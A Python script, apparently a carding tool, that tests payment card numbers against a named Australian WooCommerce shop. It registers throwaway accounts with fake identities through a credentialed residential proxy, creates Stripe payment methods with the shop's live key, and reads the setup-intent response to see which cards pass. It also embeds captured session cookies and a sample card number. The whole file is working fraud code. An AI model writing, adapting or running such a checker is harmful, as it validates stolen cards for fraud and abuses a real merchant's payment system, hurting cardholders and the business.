import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "proxy.insideproxy.net:3389:res-any:pgw-df6b371b8ec65c798929f20b1b3257302159d84a48d2a1d5"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx=ccx.strip()
    numbers = re.findall(r"\d+", ccx)
    n = mm = yy = cvc = ""
    if len(numbers) >= 4:
        n = numbers[0]
        mm = numbers[1]
        yy = numbers[2]
        cvc = numbers[3]
        mm = str(int(mm))
        if len(yy) == 4:
            yy = yy[-2:]


    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)

    headers = {
        'authority': 'hendrahabits.com.au',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'referer': 'https://hendrahabits.com.au/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    response = session.get('https://hendrahabits.com.au/my-account/add-payment-method/', headers=headers)
    
    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
    print(register)
    
    cookies = {
        '_gcl_au': '1.1.1542088503.1778344463',
        '_ga_0H6JQ9GKBT': 'GS2.1.s1778344463$o1$g0$t1778344463$j60$l0$h0',
        '_ga': 'GA1.1.1963900646.1778344463',
        'g_state': '{"i_l":0,"i_ll":1778344463507,"i_b":"joEqf7/A71KzDlSW6pnz/a8/VNm6lJdKNnnl4twlHh8","i_e":{"enable_itp_optimization":0},"i_et":1778344463507}',
        'omnisendSessionID': 'eX4bK8sQ8PHXAo-20260509163423',
        'page-views': '1',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-09%2016%3A34%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F',
        'sbjs_first_add': 'fd%3D2026-05-09%2016%3A34%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F',
        '_fbp': 'fb.2.1778344464123.818270360171396828.AQYCAQIB',
        'tk_ai': 'XMIRf+9PozDX7J2TAmLOdcIW',
        '__stripe_mid': 'e5fe55df-b6e5-498e-b74f-bc594f3f0330480340',
        '__stripe_sid': 'c26ed7e9-4656-498a-b78d-46fa211e62ab44ce64',
        'omnisend-form-65e825a11848bd2bd000c037-closed-at': '2026-05-09T16:34:55.780Z',
    }
    
    headers = {
        'authority': 'hendrahabits.com.au',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': '_gcl_au=1.1.1542088503.1778344463; _ga_0H6JQ9GKBT=GS2.1.s1778344463$o1$g0$t1778344463$j60$l0$h0; _ga=GA1.1.1963900646.1778344463; g_state={"i_l":0,"i_ll":1778344463507,"i_b":"joEqf7/A71KzDlSW6pnz/a8/VNm6lJdKNnnl4twlHh8","i_e":{"enable_itp_optimization":0},"i_et":1778344463507}; omnisendSessionID=eX4bK8sQ8PHXAo-20260509163423; page-views=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-09%2016%3A34%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2026-05-09%2016%3A34%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F; _fbp=fb.2.1778344464123.818270360171396828.AQYCAQIB; tk_ai=XMIRf+9PozDX7J2TAmLOdcIW; __stripe_mid=e5fe55df-b6e5-498e-b74f-bc594f3f0330480340; __stripe_sid=c26ed7e9-4656-498a-b78d-46fa211e62ab44ce64; omnisend-form-65e825a11848bd2bd000c037-closed-at=2026-05-09T16:34:55.780Z',
        'origin': 'https://hendrahabits.com.au',
        'referer': 'https://hendrahabits.com.au/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'email': f'rodamuser{nr}@gmail.com',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': 'https://hendrahabits.com.au/my-account/add-payment-method/',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://hendrahabits.com.au/my-account/add-payment-method/',
        'wc_order_attribution_session_start_time': '2026-05-09 16:34:24',
        'wc_order_attribution_session_pages': '1',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'woocommerce-register-nonce': f'{register}',
        '_wp_http_referer': '/my-account/add-payment-method/',
        'register': 'Register',
    }
    
    response = session.post('https://hendrahabits.com.au/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
    
    ajax = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text).group(1)
    print(ajax)
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=AU&payment_user_agent=stripe.js%2Fc891fde8fc%3B+stripe-js-v3%2Fc891fde8fc%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhendrahabits.com.au&time_on_page=105109&client_attribution_metadata[client_session_id]=086f9aa5-e57b-4f4a-89ab-11b6e873e731&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1X3mu2C1RXy&client_attribution_metadata[elements_session_config_id]=8b325239-dad6-49f1-8662-0fb2ba37a686&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=3061c4fa-b194-4250-9fd1-9445b4e28e75d3693c&muid=e5fe55df-b6e5-498e-b74f-bc594f3f0330480340&sid=c26ed7e9-4656-498a-b78d-46fa211e62ab44ce64&key=pk_live_51Lv72tBTsguVbm1C8raLSY7GRZM7Ag7jHFBLzEBOtYP3lg53GRev8R3CZjJmv4la6iKCOn1UbOPgDvTbnb7GOaBB00QzUJtLnx'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    pm = response.json()['id']
    print(pm)
    
    cookies = {
        'wordpress_sec_ace4c45a69a6f764511956942f9ea524': 'rodamuser04%7C1779554110%7C6TwEbKNTwHoV8Jv5gS8jzaaOJzzVPW5SzLL3nSQJyZD%7C8a4f1cab83e88389b1a53eea089979896ed3a2891fcff4ea9e9c8c65d85ef702',
        '_gcl_au': '1.1.1542088503.1778344463',
        '_ga_0H6JQ9GKBT': 'GS2.1.s1778344463$o1$g0$t1778344463$j60$l0$h0',
        '_ga': 'GA1.1.1963900646.1778344463',
        'omnisendSessionID': 'eX4bK8sQ8PHXAo-20260509163423',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-09%2016%3A34%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F',
        'sbjs_first_add': 'fd%3D2026-05-09%2016%3A34%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        '_fbp': 'fb.2.1778344464123.818270360171396828.AQYCAQIB',
        'tk_ai': 'XMIRf+9PozDX7J2TAmLOdcIW',
        '__stripe_mid': 'e5fe55df-b6e5-498e-b74f-bc594f3f0330480340',
        '__stripe_sid': 'c26ed7e9-4656-498a-b78d-46fa211e62ab44ce64',
        'omnisend-form-65e825a11848bd2bd000c037-closed-at': '2026-05-09T16:34:55.780Z',
        'wordpress_logged_in_ace4c45a69a6f764511956942f9ea524': 'rodamuser04%7C1779554110%7C6TwEbKNTwHoV8Jv5gS8jzaaOJzzVPW5SzLL3nSQJyZD%7Caafc37fe78ecd4713aa955925b2e2918cbac631d834a19b5303323dca6997291',
        'wfwaf-authcookie-e6a00829763eafc3ddad7f0fbd6da75a': '1799%7Cother%7Cread%7C80e08042a5b5dff060a0982f6212545f135b8f079181d48b8641cf98eb9508a9',
        'g_state': '{"i_l":0,"i_ll":1778344513503,"i_b":"joEqf7/A71KzDlSW6pnz/a8/VNm6lJdKNnnl4twlHh8","i_e":{"enable_itp_optimization":0},"i_et":1778344463507}',
        'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F',
        'tk_qs': '',
        'page-views': '2',
    }
    
    headers = {
        'authority': 'hendrahabits.com.au',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'wordpress_sec_ace4c45a69a6f764511956942f9ea524=rodamuser04%7C1779554110%7C6TwEbKNTwHoV8Jv5gS8jzaaOJzzVPW5SzLL3nSQJyZD%7C8a4f1cab83e88389b1a53eea089979896ed3a2891fcff4ea9e9c8c65d85ef702; _gcl_au=1.1.1542088503.1778344463; _ga_0H6JQ9GKBT=GS2.1.s1778344463$o1$g0$t1778344463$j60$l0$h0; _ga=GA1.1.1963900646.1778344463; omnisendSessionID=eX4bK8sQ8PHXAo-20260509163423; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-09%2016%3A34%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2026-05-09%2016%3A34%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; _fbp=fb.2.1778344464123.818270360171396828.AQYCAQIB; tk_ai=XMIRf+9PozDX7J2TAmLOdcIW; __stripe_mid=e5fe55df-b6e5-498e-b74f-bc594f3f0330480340; __stripe_sid=c26ed7e9-4656-498a-b78d-46fa211e62ab44ce64; omnisend-form-65e825a11848bd2bd000c037-closed-at=2026-05-09T16:34:55.780Z; wordpress_logged_in_ace4c45a69a6f764511956942f9ea524=rodamuser04%7C1779554110%7C6TwEbKNTwHoV8Jv5gS8jzaaOJzzVPW5SzLL3nSQJyZD%7Caafc37fe78ecd4713aa955925b2e2918cbac631d834a19b5303323dca6997291; wfwaf-authcookie-e6a00829763eafc3ddad7f0fbd6da75a=1799%7Cother%7Cread%7C80e08042a5b5dff060a0982f6212545f135b8f079181d48b8641cf98eb9508a9; g_state={"i_l":0,"i_ll":1778344513503,"i_b":"joEqf7/A71KzDlSW6pnz/a8/VNm6lJdKNnnl4twlHh8","i_e":{"enable_itp_optimization":0},"i_et":1778344463507}; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhendrahabits.com.au%2Fmy-account%2Fadd-payment-method%2F; tk_qs=; page-views=2',
        'origin': 'https://hendrahabits.com.au',
        'referer': 'https://hendrahabits.com.au/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': f'{pm}',
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': f'{ajax}',
    }
    
    response = session.post('https://hendrahabits.com.au/wp-admin/admin-ajax.php', #cookies=cookies, 
    headers=headers, data=data)
    try:
        result = re.search(r'"message":"(.*?)"', response.text).group(1)
    except:
        result = re.search(r'"status":"(.*?)"', response.text).group(1)

    return result
    
#test_card = "5488093801213161|10|28|945"
#print(Tele(test_card))
